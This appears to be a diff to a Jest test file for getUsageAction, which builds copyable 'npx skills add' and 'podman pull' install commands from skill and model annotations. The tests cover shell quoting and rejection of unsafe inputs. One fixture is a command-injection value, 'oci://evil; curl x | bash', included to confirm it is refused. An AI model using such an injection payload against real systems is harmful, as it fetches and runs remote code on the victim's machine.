@@ -53,6 +53,115 @@ describe('getUsageAction', () => {
     expect(action).toEqual({ type: 'copy', value: 'npx skills add my-skill' });
   });
 
+  it('returns npx copy command for Git-backed skill entities', () => {
+    const action = getUsageAction(
+      entity({
+        name: 'my-skill',
+        specType: 'skill',
+        annotations: { 'rhdh.io/ai-asset-source': 'github' },
+      }),
+    );
+    expect(action).toEqual({ type: 'copy', value: 'npx skills add my-skill' });
+  });
+
+  const imported = {
+    'rhdh.io/ai-asset-source': 'npx/public-agent-skills',
+    'rhdh.io/npx-skill-registry': 'https://evilmartians.com',
+    'rhdh.io/npx-skill-key': 'good-readme',
+  };
+  it('copies the registry and index key for an imported skill', () => {
+    expect(
+      getUsageAction(
+        entity({
+          name: 'skill-abc123',
+          specType: 'skill',
+          annotations: imported,
+        }),
+      ),
+    ).toEqual({
+      type: 'copy',
+      value: "npx skills add 'https://evilmartians.com' --skill good-readme",
+    });
+  });
+  it('quotes a registry path as one shell argument', () => {
+    const annotations = {
+      ...imported,
+      'rhdh.io/npx-skill-registry': "https://registry.example/team's/(public)",
+    };
+    expect(
+      getUsageAction(entity({ specType: 'skill', annotations }))?.value,
+    ).toBe(
+      "npx skills add 'https://registry.example/team'\\''s/(public)' --skill good-readme",
+    );
+  });
+  it.each([
+    { 'rhdh.io/npx-skill-registry': '' },
+    { 'rhdh.io/npx-skill-registry': 'https://user@registry.example' },
+    { 'rhdh.io/npx-skill-registry': 'https://registry.example?token=secret' },
+    { 'rhdh.io/npx-skill-registry': 'http://registry.example' },
+    { 'rhdh.io/npx-skill-key': '--all' },
+    { 'rhdh.io/npx-skill-key': '' },
+  ])('hides an incomplete or invalid registry command (%j)', override => {
+    expect(
+      getUsageAction(
+        entity({
+          specType: 'skill',
+          annotations: { ...imported, ...override },
+        }),
+      ),
+    ).toBeUndefined();
+  });
+  it('preserves the existing action when an older npx entity lacks install metadata', () => {
+    expect(
+      getUsageAction(
+        entity({
+          specType: 'skill',
+          name: 'legacy',
+          annotations: { 'rhdh.io/ai-asset-source': 'npx/old' },
+        }),
+      )?.value,
+    ).toBe('npx skills add legacy');
+  });
+
+  it('returns a Podman pull command for an OCI skill reference', () => {
+    const action = getUsageAction(
+      entity({
+        name: 'document-reviewer',
+        specType: 'skill',
+        annotations: {
+          'rhdh.io/ai-asset-source': 'oci/skillimage-skills',
+          'rhdh.io/oci-skill-ref':
+            'oci://quay.io/skillimage/document-reviewer@sha256:ae46db36245efd25e84472ce32492e1db48015f7d07b6d4366fff384650695ac',
+        },
+      }),
+    );
+    expect(action).toEqual({
+      type: 'copy',
+      value:
+        'podman pull quay.io/skillimage/document-reviewer@sha256:ae46db36245efd25e84472ce32492e1db48015f7d07b6d4366fff384650695ac',
+    });
+  });
+
+  it.each([
+    { description: 'missing', reference: undefined },
+    { description: 'unsafe', reference: 'oci://evil; curl x | bash' },
+  ])(
+    'returns no action for an OCI skill with a $description reference',
+    ({ reference }) => {
+      const action = getUsageAction(
+        entity({
+          name: 'my-skill',
+          specType: 'skill',
+          annotations: {
+            'rhdh.io/ai-asset-source': 'oci/skillimage-skills',
+            ...(reference && { 'rhdh.io/oci-skill-ref': reference }),
+          },
+        }),
+      );
+      expect(action).toBeUndefined();
+    },
+  );
+
   it('returns podman pull command for the first oci:// remote', () => {
     const action = getUsageAction(
       entity({
@@ -65,7 +174,7 @@ describe('getUsageAction', () => {
     );
     expect(action).toEqual({
       type: 'copy',
-      value: 'podman pull oci://registry.example.com/models/foo:latest',
+      value: 'podman pull registry.example.com/models/foo:latest',
     });
   });
 
@@ -274,7 +383,7 @@ describe('getUsageAction', () => {
     );
     expect(action).toEqual({
       type: 'copy',
-      value: 'podman pull oci://registry.example.com/models/foo:latest',
+      value: 'podman pull registry.example.com/models/foo:latest',
     });
   });
 
@@ -292,7 +401,7 @@ describe('getUsageAction', () => {
     );
     expect(action).toEqual({
       type: 'copy',
-      value: 'podman pull oci://registry.example.com:5000/models/foo:latest',
+      value: 'podman pull registry.example.com:5000/models/foo:latest',
     });
   });
 
